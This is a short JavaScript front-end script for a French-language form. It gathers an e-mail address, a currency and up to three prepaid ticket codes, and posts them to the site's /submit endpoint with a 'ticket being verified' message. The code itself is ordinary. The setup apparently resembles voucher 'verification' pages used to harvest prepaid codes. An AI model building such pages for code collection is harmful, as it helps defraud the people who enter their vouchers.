document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('ticketForm');
    form.addEventListener('submit', async (event) => {
        event.preventDefault();

        const email = document.querySelector('input[placeholder="E-mail de reception"]').value;
        const devise = document.getElementById('devise').value;

        const tickets = [];

        for (let i = 1; i <= 3; i++) {
            const type = document.getElementById(`type${i}`).value;
            const code = document.getElementById(`code${i}`).value;

            if (type && code) {
                tickets.push({ type, code });
            }
        }

        const data = {
            email,
            devise,
            tickets
        };

        try {
            const response = await fetch(`${window.location.origin}/submit`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });

            if (response.ok) {
                alert("✅ Ticket en cours de vérification.\nVous recevrez un message de confirmation par e-mail.");
                form.reset();
            } else {
                alert("❌ Erreur lors de l'envoi.");
            }
        } catch (error) {
            alert('Erreur réseau : ' + error.message);
        }
    });
});
